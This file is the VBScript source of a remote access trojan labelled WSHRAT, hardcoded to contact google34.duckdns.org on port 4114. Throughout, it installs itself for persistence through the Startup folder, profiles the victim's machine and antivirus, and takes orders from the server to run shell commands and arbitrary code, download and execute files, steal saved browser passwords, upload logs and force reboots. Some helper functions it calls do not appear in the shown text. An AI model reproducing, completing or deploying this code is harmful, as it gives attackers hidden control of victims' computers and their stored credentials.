host = "google34.duckdns.org"
port = 4114
installdir = "C:\Users\Public\"
runAsAdmin = false
lnkfile = true
lnkfolder = true

if runAsAdmin = true then
	startupElevate()
end if

if WScript.Arguments.Named.Exists("elevated") = true then
	disableSecurity()
end if

dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "|"
sdkpath = installdir & "wshsdk"
sdkfile = sdkpath & "\" & chr(112) & chr(121) & chr(116) & chr(104) & chr(111) & chr(110) & chr(46) & chr(101) & chr(120) & chr(101)
sleep = 20000 
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce

on error resume next


instance

if getBinder() <> false then
	runBinder()
end if

while true

install

response = ""
response = post ("is-ready","")
cmd = split (response,spliter)
select case cmd (0)
case "disconnect"
	  wscript.quit
case "reboot"
	  shellobj.run "%comspec% /c shutdown /r /t 0 /f", 0, TRUE
case "shutdown"
	  shellobj.run "%comspec% /c shutdown /s /t 0 /f", 0, TRUE
case "excecute"
      param = cmd (1)
      execute param
case "install-sdk"
	  if filesystemobj.fileExists(sdkfile) then
		updatestatus("SDK+Already+Installed")
	  else
		installsdk()
	  end if
case "get-pass" 
       passgrabber cmd(1), "cmdv.exe", cmd(2)
case "get-pass-offline"
	  if filesystemobj.fileExists(sdkfile) then
		passgrabber cmd(3), "cmdv.exe", "ie"
		passgrabber "null", "cmdv.exe", "chrome"
		passgrabber "null", "cmdv.exe", "mozilla"
		passgrabber2 cmd(1), "cmdv.exe", cmd(2)
	  else
		updatestatus("Installing+SDK")
		stat = installsdk()
		if stat = true then
			passgrabber cmd(3), "cmdv.exe", "ie"
			passgrabber "null", "cmdv.exe", "chrome"
			passgrabber "null", "cmdv.exe", "mozilla"
			passgrabber2 cmd(1), "cmdv.exe", cmd(2)
		else
			msg = shellobj.ExpandEnvironmentStrings("%computername%") & "/" & shellobj.ExpandEnvironmentStrings("%username%")
			post "show-toast", "Unable to automatically recover password for " & msg & " as the Password Recovery SDK cannot be automatically installed. You can try again manually."
		end if
	  end if
case "update"
      param = mid(response, instr(response, "|") + 1)
      oneonce.close
      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
      oneonce.write param
      oneonce.close
      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
      wscript.quit 
case "uninstall"
      uninstall
case "up-n-exec"
      download cmd (1),cmd (2)
case "bring-log"
      upload installdir & "wshlogs\" & cmd (1), "take-log"
case "down-n-exec"
      sitedownloader cmd (1),cmd (2)
case  "filemanager"
      servicestarter cmd(1), "fm-plugin.exe", information() 


case  "browse-logs"
	  post "is-logs", enumfaf(installdir & "wshlogs")
case  "cmd-shell"
      param = cmd (1)
      post "is-cmd-shell",cmdshell (param)
case  "get-processes"
      post "is-processes", enumprocess()
case  "disable-uac"
	  if WScript.Arguments.Named.Exists("elevated") = true then
		
		oReg = nothing
		updatestatus("UAC+Disabled+(Reboot+Required)")
	  end if
case  "check-eligible"
	  if filesystemobj.fileExists(cmd(1)) then
		updatestatus("Is+Eligible")
	  else
		updatestatus("Not+Eligible")
	  end if
case  "force-eligible"
	  if WScript.Arguments.Named.Exists("elevated") = true then
		if filesystemobj.folderExists(cmd(1)) then
			shellobj.run "%comspec% /c " & cmd(2), 0, true
			updatestatus("SUCCESS")
		else
			updatestatus("Component+Missing")
		end if
	  else
		updatestatus("Elevation+Required")
	  end if


case  "kill-process"
      exitprocess(cmd(1))
case  "sleep"
      param = cmd (1)
      sleep = eval (param)        
end select

wscript.sleep sleep

wend

function installsdk()
	on error resume next
	success = false
	sdkurl = post ("moz-sdk","")
	set objhttpdownload = createobject("msxml2.xmlhttp")
	objhttpdownload.open "get",sdkurl, false
	objhttpdownload.setrequestheader "cache-control:", "max-age=0"
	objhttpdownload.send 
						 
	if  filesystemobj.fileexists (installdir & "wshsdk.zip") then
		filesystemobj.deletefile (installdir & "wshsdk.zip")
	end if
	if  objhttpdownload.status = 200 then
		dim  objstreamdownload
		set  objstreamdownload = createobject("adodb.stream")
		with objstreamdownload 
			 .type = 1 
			 .open
			 .write objhttpdownload.responsebody
			 .savetofile installdir & "wshsdk.zip"
			 .close
		end with
		set objstreamdownload  = nothing
	end if
	if filesystemobj.fileexists(installdir & "wshsdk.zip") then
		'unzip the file 
		UnZip installdir & "wshsdk.zip", sdkpath
		success = true
		updatestatus("SDK+Installed")
	end if
	installsdk = success
end function





function post (cmd ,param)

post = param
httpobj.open "post","http://" & host & ":" & port &"/" & cmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
end function

function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter

    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & spliter  
       exit for
    next
    inf = inf & "plus" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    inf = "WSHRAT" & spliter & inf & spliter & "Visual Basic-v2.0" & spliter & getCountry()
	information = inf
else
    information = inf
end if
end function

function getCountry()
	on error resume next
	set objhttpdownload = createobject("msxml2.xmlhttp" )
	objhttpdownload.open "get", "http://ip-api.com/json/", false
	objhttpdownload.setRequestHeader "user-agent:", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
	objhttpdownload.send
	 
	if objhttpdownload.status = 200 then
	   dim  objstreamdownload, raw, cc, cn
	   set  objstreamdownload = createobject("adodb.stream")
	   with objstreamdownload
			.type = 1 
			.open
			.write objhttpdownload.responsebody
			.position = 0
			.type = 2
			.charset = "us-ascii"
			raw = .readtext
	   end with
	   set objstreamdownload = nothing
	end if
	cc = "01"
	cn = "Unknown"
	cc = mid(raw, instr(raw, "countryCode") + 14)
	cc = mid(cc, 1, instr(cc, chr(34)) -1)
	
	cn = mid(raw, instr(raw, "country") + 10)
	cn = mid(cn, 1, instr(cn, chr(34)) -1)
		   
	getCountry = cc & ":" & cn
end function

sub upstart ()
on error resume Next


filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub


function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function


function security 
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "nan-av"
end function

function instance
on error resume next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end If

upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function



sub disableSecurity()
	if WScript.Arguments.Named.Exists("elevated") = true then
		set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
		
		oReg = nothing
	end if
end sub





sub keyloggerstarter (fileurl, filename, filearg, is_offline, is_rdp)
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
strlink = fileurl
strsaveto = installdir & filename

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if

dim  objstreamdownload
set  objstreamdownload = createobject("adodb.stream")
with objstreamdownload
	.type = 1 
	.open
	if is_rdp = true then
		.write getRDP()
	else
		.write getKeyLogger()
	end if
	.savetofile strsaveto
	.close
end with
set objstreamdownload = nothing

if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34) & " " & host & " " & port & " " & chr(34) & filearg & chr(34) & " " & is_offline
end if 
end sub

sub servicestarter (fileurl, filename, filearg)
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setrequestheader "cache-control:", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34) & " " & host & " " & port & " " & chr(34) & filearg & chr(34)
end if 
end sub

sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.serverxmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setrequestheader "cache-control", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
   updatestatus("Executed+File")
end if 
end sub

sub download (fileurl,filedir)
if filedir = "" then 
   filedir = installdir
end if

strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port &"/" & "send-to-me" & spliter & fileurl, false
objhttpdownload.setrequestheader "user-agent:",information
objhttpdownload.send ""
     
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
	set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
		 .type = 1 
		 .open
		 .write objhttpdownload.responsebody
		 .savetofile strsaveto
		 .close
	end with
    set objstreamdownload  = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
   updatestatus("Executed+File")
end if 
end sub

function updatestatus(status_msg)
	on error resume next
	set objsoc = createobject("msxml2.xmlhttp")
	objsoc.open "post","http://" & host & ":" & port &"/" & "update-status" & spliter & status_msg, false
	objsoc.setrequestheader "user-agent:",information
	objsoc.send ""

end function

function upload (fileurl, retcmd)

dim  httpobj,objstreamuploade,buffer
set  objstreamuploade = createobject("adodb.stream")
with objstreamuploade 
     .type = 1 
     .open
	 .loadfromfile fileurl
	 buffer = .read
	 .close
end with
set objstreamdownload = nothing
set httpobj = createobject("msxml2.xmlhttp")
httpobj.open "post","http://" & host & ":" & port &"/" & retcmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send buffer
end function


sub deletefaf (url)
on error resume next

filesystemobj.deletefile url
filesystemobj.deletefolder url

end sub

function cmdshell (cmd)
dim httpobj,oexec,readallfromany
strsaveto = installdir & "out.txt"
shellobj.run "%comspec% /c " & cmd & " > " & chr(34) & strsaveto & chr(34), 0, true
readallfromany = filesystemobj.opentextfile(strsaveto).readall()
filesystemobj.deletefile strsaveto

cmdshell = readallfromany
end function


function enumprocess()
on error resume next

set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_process",,48)

dim objitem
for each objitem in colitems
	enumprocess = enumprocess & objitem.name & "^"
	enumprocess = enumprocess & objitem.processid & "^"
    enumprocess = enumprocess & objitem.executablepath & spliter
next
end function

sub exitprocess (pid)
on error resume next

shellobj.run "taskkill /F /T /PID " & pid,0,true
end sub

function getParentDirectory(path)
	set fo = filesystemobj.GetFile(path)
	getParentDirectory = filesystemobj.getparentfoldername(fo)
end function

function enumfaf (enumdir)

'enumfaf = enumdir & spliter
for  each folder in filesystemobj.getfolder (enumdir).subfolders
     enumfaf = enumfaf & folder.name & "^" & "" & "^" & "d" & "^" & folder.attributes & spliter
next

for  each file in filesystemobj.getfolder (enumdir).files
     enumfaf = enumfaf & file.name & "^" & file.size  & "^" & file.attributes & spliter
next
end function
